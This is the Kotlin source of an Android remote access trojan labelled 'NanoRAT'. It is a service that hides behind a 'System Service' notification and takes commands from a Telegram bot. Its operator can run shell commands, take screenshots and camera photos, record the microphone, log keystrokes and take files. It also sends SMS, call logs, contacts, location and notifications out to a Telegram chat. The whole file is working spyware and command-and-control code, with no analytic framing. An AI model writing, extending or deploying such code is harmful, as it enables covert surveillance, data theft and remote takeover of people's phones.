package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class TelegramC2Service : Service() {

    companion object {
        private const val TAG = "TgC2"
        private const val NOTIF_ID = 2
        private const val CHANNEL_ID = "c2tg"
        private const val API_BASE = "https://api.telegram.org/bot"
    }

    private val BOT_TOKEN: String = BuildConfig.TG_BOT_TOKEN
    private val CHAT_ID: String = BuildConfig.TG_CHAT_ID

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }

    @Volatile private var projection: MediaProjection? = null
    @Volatile private var captureSession: ScreenCaptureSession? = null
    @Volatile private var lastUpdateId: Long = 0
    @Volatile private var lastMenuMessageId: Long = 0

    private fun log(msg: String) {
        android.util.Log.i(TAG, msg)
        LogBus.append(applicationContext, "TG", msg)
    }

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)

        if (BOT_TOKEN.isEmpty() || BOT_TOKEN.startsWith("TG_TOKEN")) {
            log("BOT_TOKEN not configured")
            return
        }
        if (CHAT_ID.isEmpty() || CHAT_ID.startsWith("TG_CHAT")) {
            log("CHAT_ID not configured")
            return
        }

        scope.launch {
            registerBotCommands()
            delay(500)
            sendMainMenu()
        }
        scope.launch { pollLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")
        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        log("initProjection: code=$resultCode")
        try {
            captureSession?.release()
            captureSession = null
            try { projection?.stop() } catch (_: Exception) {}
            projection = null

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)
            log("getMediaProjection: $proj")
            if (proj == null) return

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    log("projection onStop")
                    captureSession?.release()
                    captureSession = null
                    projection = null
                }
            }, Handler(Looper.getMainLooper()))

            projection = proj
            captureSession = ScreenCaptureSession(this, proj)
            log("projection ACTIVE with capture session")
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
            captureSession = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "TG", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ---------- Telegram API ----------

    private suspend fun apiCall(method: String, body: RequestBody): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url("$API_BASE$BOT_TOKEN/$method")
                .post(body)
                .build()
            try {
                val raw = client.newCall(req).execute().use { r -> r.body?.string() }
                if (raw == null) return@withContext null
                if (!raw.trimStart().startsWith("{")) {
                    log("api $method: non-JSON response (${raw.take(80)}…)")
                    return@withContext null
                }
                JSONObject(raw)
            } catch (e: Exception) {
                log("api $method failed: ${e.message}")
                null
            }
        }

    private suspend fun sendMessage(text: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .build()
        apiCall("sendMessage", body)
    }

    private suspend fun sendMessageWithKeyboard(text: String, keyboard: JSONObject): Long {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        val resp = apiCall("sendMessage", body)
        return resp?.optJSONObject("result")?.optLong("message_id") ?: 0L
    }

    private suspend fun editMessageWithKeyboard(
        messageId: Long, text: String, keyboard: JSONObject
    ) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("message_id", messageId.toString())
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        apiCall("editMessageText", body)
    }

    private suspend fun answerCallback(callbackId: String, text: String = "") {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("callback_query_id", callbackId)
            .addFormDataPart("text", text)
            .build()
        apiCall("answerCallbackQuery", body)
    }

    private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody(mime.toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", filename, fileBody)
            .build()
        apiCall("sendDocument", body)
    }

    private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray, caption: String = "") {
        val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", filename, fileBody)
        if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
        apiCall("sendPhoto", builder.build())
    }

    private suspend fun sendAudio(filename: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("audio", filename, fileBody)
            .build()
        apiCall("sendAudio", body)
    }

    private suspend fun registerBotCommands() {
        val cmds = JSONArray().apply {
            put(JSONObject().put("command", "start").put("description", "🏠 Main menu"))
            put(JSONObject().put("command", "menu").put("description", "📋 Show menu"))
            put(JSONObject().put("command", "help").put("description", "❓ Help"))
            put(JSONObject().put("command", "info").put("description", "📱 Device info"))
            put(JSONObject().put("command", "shell").put("description", "💻 Run shell command"))
            put(JSONObject().put("command", "screenshot").put("description", "📸 Screen capture"))
        }
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("commands", cmds.toString())
            .build()
        apiCall("setMyCommands", body)
    }

    // ---------- Menus ----------

    private fun buildMainMenu(): JSONObject {
        val online = projection != null
        val devicesOnline = if (online) "🟢 online" else "🟡 limited"
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 Capture").put("callback_data", "menu:capture"))
                put(JSONObject().put("text", "🎙 Record").put("callback_data", "menu:record"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📁 Files").put("callback_data", "menu:files"))
                put(JSONObject().put("text", "📊 Info").put("callback_data", "menu:info"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎮 Control").put("callback_data", "menu:control"))
                put(JSONObject().put("text", "💬 Comms").put("callback_data", "menu:comms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔐 Privacy").put("callback_data", "menu:privacy"))
                put(JSONObject().put("text", "⚙️ System").put("callback_data", "menu:system"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildCaptureMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 Screenshot").put("callback_data", "act:screenshot"))
                put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildRecordMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎙 5s").put("callback_data", "act:mic:5"))
                put(JSONObject().put("text", "🎙 10s").put("callback_data", "act:mic:10"))
                put(JSONObject().put("text", "🎙 30s").put("callback_data", "act:mic:30"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildFilesMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 /sdcard").put("callback_data", "act:ls:/sdcard"))
                put(JSONObject().put("text", "📥 Download").put("callback_data", "prompt:get"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 Downloads").put("callback_data", "act:ls:/sdcard/Download"))
                put(JSONObject().put("text", "📂 DCIM").put("callback_data", "act:ls:/sdcard/DCIM"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildInfoMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📱 Device").put("callback_data", "act:info"))
                put(JSONObject().put("text", "🌐 Network").put("callback_data", "act:network"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📍 Location").put("callback_data", "act:location"))
                put(JSONObject().put("text", "📱 Apps").put("callback_data", "act:apps"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildControlMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔒 Lock").put("callback_data", "act:lock"))
                put(JSONObject().put("text", "🏠 Home").put("callback_data", "act:home"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "◀️ Back").put("callback_data", "act:back"))
                put(JSONObject().put("text", "🪟 Recents").put("callback_data", "act:recents"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "💻 Shell").put("callback_data", "prompt:shell"))
                put(JSONObject().put("text", "🔗 Open URL").put("callback_data", "prompt:url"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildCommsMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📞 Calls").put("callback_data", "act:calls"))
                put(JSONObject().put("text", "💬 SMS").put("callback_data", "act:sms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "👥 Contacts").put("callback_data", "act:contacts"))
                put(JSONObject().put("text", "🔔 Notifications").put("callback_data", "act:notif"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildPrivacyMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "⌨️ Keylog start").put("callback_data", "act:keylog_start"))
                put(JSONObject().put("text", "⌨️ Keylog dump").put("callback_data", "act:keylog_dump"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⌨️ Keylog stop").put("callback_data", "act:keylog_stop"))
                put(JSONObject().put("text", "🔔 Drain notif").put("callback_data", "act:notif"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun buildSystemMenu(): JSONObject {
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Restart polling").put("callback_data", "act:refresh"))
                put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:main"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun mainMenuText(): String {
        val model = Build.MODEL
        val maker = Build.MANUFACTURER
        val projStatus = if (projection != null) "🟢 capture ready" else "🟡 capture disabled"
        return "<b>NanoRAT — Control Center</b>\n\n" +
               "📱 <code>$maker $model</code>\n" +
               "🆔 <code>${deviceId.take(8)}…</code>\n" +
               "🎬 $projStatus"
    }

    private suspend fun sendMainMenu() {
        val id = sendMessageWithKeyboard(mainMenuText(), buildMainMenu())
        if (id > 0) lastMenuMessageId = id
    }

    // ---------- Long poll ----------

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("offset", (lastUpdateId + 1).toString())
                    .addFormDataPart("timeout", "30")
                    .addFormDataPart("allowed_updates", "[\"message\",\"callback_query\"]")
                    .build()

                val resp = apiCall("getUpdates", body)
                if (resp == null) { delay(3000); continue }
                if (!resp.optBoolean("ok", false)) { delay(5000); continue }

                val results = resp.optJSONArray("result") ?: JSONArray()
                for (i in 0 until results.length()) {
                    val upd = results.getJSONObject(i)
                    val updateId = upd.optLong("update_id")
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(upd)
                }
            } catch (e: Exception) {
                log("poll error: ${e.message}")
            }
            delay(1000)
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        // Text messages
        update.optJSONObject("message")?.let { msg ->
            val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@let
            if (chatId != CHAT_ID) return@let
            val text = msg.optString("text", "").trim()
            if (text.isEmpty()) return@let
            log("cmd: $text")
            try { dispatchTextCommand(text) } catch (e: Exception) { sendMessage("error: ${e.message}") }
        }

        // Button callbacks
        update.optJSONObject("callback_query")?.let { cb ->
            val fromId = cb.optJSONObject("from")?.optLong("id")?.toString() ?: return@let
            if (fromId != CHAT_ID) return@let
            val cbId = cb.optString("id", "")
            val data = cb.optString("data", "")
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: 0L
            log("callback: $data")
            try { handleCallback(cbId, msgId, data) } catch (e: Exception) {
                answerCallback(cbId, "error: ${e.message}")
            }
        }
    }

    private suspend fun handleCallback(callbackId: String, messageId: Long, data: String) {
        val parts = data.split(":", limit = 3)
        val kind = parts.getOrNull(0) ?: return

        when (kind) {
            "menu" -> {
                val which = parts.getOrNull(1) ?: "main"
                answerCallback(callbackId)
                val (text, kb) = when (which) {
                    "main"      -> mainMenuText() to buildMainMenu()
                    "capture"   -> "<b>Capture</b>\nSelect an action:" to buildCaptureMenu()
                    "record"    -> "<b>Record audio</b>\nSelect duration:" to buildRecordMenu()
                    "files"     -> "<b>Files</b>\nBrowse or download:" to buildFilesMenu()
                    "info"      -> "<b>Info</b>\nDevice intelligence:" to buildInfoMenu()
                    "control"   -> "<b>Control</b>\nDevice actions:" to buildControlMenu()
                    "comms"     -> "<b>Comms</b>\nContacts & messages:" to buildCommsMenu()
                    "privacy"   -> "<b>Privacy</b>\nKeylogger & notifications:" to buildPrivacyMenu()
                    "system"    -> "<b>System</b>\nMaintenance:" to buildSystemMenu()
                    "close"     -> {
                        // delete the message
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", CHAT_ID)
                            .addFormDataPart("message_id", messageId.toString())
                            .build()
                        apiCall("deleteMessage", body)
                        return
                    }
                    else        -> mainMenuText() to buildMainMenu()
                }
                editMessageWithKeyboard(messageId, text, kb)
            }

            "act" -> {
                val action = parts.getOrNull(1) ?: return
                val sub = parts.getOrNull(2) ?: ""
                answerCallback(callbackId, "working...")
                runAction(action, sub)
            }

            "prompt" -> {
                val what = parts.getOrNull(1) ?: return
                answerCallback(callbackId, "send /$what <value>")
                sendMessage("Send <code>/$what &lt;value&gt;</code>")
            }
        }
    }

    private suspend fun runAction(action: String, sub: String) {
        when (action) {
            "screenshot" -> {
                val session = captureSession
                if (session == null) { sendMessage("projection not active"); return }
                val res = session.capture()
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("capture failed: ${res.optString("error")}"); return }
                sendPhoto("screen_${System.currentTimeMillis()}.jpg",
                          Base64.decode(b64, Base64.NO_WRAP),
                          "📸 screenshot")
            }
            "camera" -> {
                val cam = sub.ifEmpty { "back" }
                val res = Camera.capture(this, cam)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("camera error: ${res.optString("error")}"); return }
                sendPhoto("cam_${System.currentTimeMillis()}.jpg",
                          Base64.decode(b64, Base64.NO_WRAP),
                          "📷 $cam camera")
            }
            "mic" -> {
                val sec = sub.toIntOrNull()?.coerceIn(1, 60) ?: 10
                sendMessage("🎙 recording ${sec}s...")
                val res = Audio.record(this, sec)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("mic error: ${res.optString("error")}"); return }
                sendAudio("mic_${System.currentTimeMillis()}.m4a", Base64.decode(b64, Base64.NO_WRAP))
            }
            "info" -> sendMessage("<pre>${DeviceInfo.snapshot(this, deviceId).toString(2)}</pre>")
            "network" -> sendMessage("<pre>${NetworkInfo.snapshot(this).toString(2).take(3500)}</pre>")
            "location" -> sendMessage("<pre>${Location.get(this).toString(2)}</pre>")
            "apps" -> sendDocument("apps.json", "application/json",
                                    Apps.list(this, false).toString().toByteArray())
            "calls" -> sendDocument("calls.json", "application/json",
                                     CallLog.list(this, 50).toString().toByteArray())
            "sms" -> sendDocument("sms.json", "application/json",
                                   Sms.list(this, 50).toString().toByteArray())
            "contacts" -> sendDocument("contacts.json", "application/json",
                                        Contacts.list(this).toString().toByteArray())
            "notif" -> {
                val res = JSONObject()
                    .put("count", NotificationsBuffer.peek().length())
                    .put("items", NotificationsBuffer.drain())
                sendDocument("notifications.json", "application/json", res.toString().toByteArray())
            }
            "lock" -> sendMessage("🔒 ${SystemControl.lockScreen(this)}")
            "home" -> sendMessage("🏠 ${SystemControl.goHome()}")
            "back" -> sendMessage("◀️ ${SystemControl.back()}")
            "recents" -> sendMessage("🪟 ${SystemControl.recents()}")
            "keylog_start" -> { KeylogBuffer.start(); sendMessage("⌨️ keylogger started") }
            "keylog_stop" -> { KeylogBuffer.stop(); sendMessage("⌨️ keylogger stopped") }
            "keylog_dump" -> {
                val res = KeylogBuffer.dump()
                sendMessage("<pre>${res.optString("output", "").take(3500).ifEmpty { "(empty)" }}</pre>")
            }
            "ls" -> {
                val res = Files.listDir(sub.ifEmpty { "/sdcard" })
                sendMessage("<pre>${res.toString(2).take(3500)}</pre>")
            }
            "refresh" -> {
                sendMessage("🔄 refreshing...")
                delay(500)
                sendMainMenu()
            }
            else -> sendMessage("unknown action: $action")
        }
    }

    private suspend fun dispatchTextCommand(text: String) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = parts.getOrNull(1) ?: ""

        when (cmd) {
            "start", "menu", "help" -> sendMainMenu()

            "shell" -> {
                if (arg.isEmpty()) { sendMessage("usage: /shell &lt;cmd&gt;"); return }
                val res = Shell.exec(arg)
                val out = res.optString("stdout", "") + res.optString("stderr", "")
                sendMessage("<pre>[exit ${res.optInt("exit", -1)}]\n${out.take(3500)}</pre>")
            }

            "screenshot" -> runAction("screenshot", "")
            "camera" -> runAction("camera", arg.ifEmpty { "back" })
            "mic" -> runAction("mic", arg.ifEmpty { "10" })
            "location" -> runAction("location", "")
            "contacts" -> runAction("contacts", "")
            "sms" -> runAction("sms", arg)
            "calls" -> runAction("calls", arg)
            "apps" -> runAction("apps", "")
            "network" -> runAction("network", "")
            "notif" -> runAction("notif", "")
            "lock" -> runAction("lock", "")
            "home" -> runAction("home", "")
            "back" -> runAction("back", "")
            "recents" -> runAction("recents", "")
            "keylog_start" -> runAction("keylog_start", "")
            "keylog_stop" -> runAction("keylog_stop", "")
            "keylog_dump" -> runAction("keylog_dump", "")

            "get" -> {
                if (arg.isEmpty()) { sendMessage("usage: /get &lt;path&gt;"); return }
                val res = Files.exfil(this, arg)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("error: ${res.optString("error")}"); return }
                val name = arg.substringAfterLast('/').ifEmpty { "file.bin" }
                sendDocument(name, "application/octet-stream", Base64.decode(b64, Base64.NO_WRAP))
            }
            "open" -> sendMessage(SystemControl.openApp(this, arg).toString())
            "url" -> sendMessage(SystemControl.openUrl(this, arg).toString())
            "info" -> runAction("info", "")

            else -> sendMessage("unknown: /$cmd — try /start")
        }
    }

    override fun onDestroy() {
        log("onDestroy")
        captureSession?.release()
        captureSession = null
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}
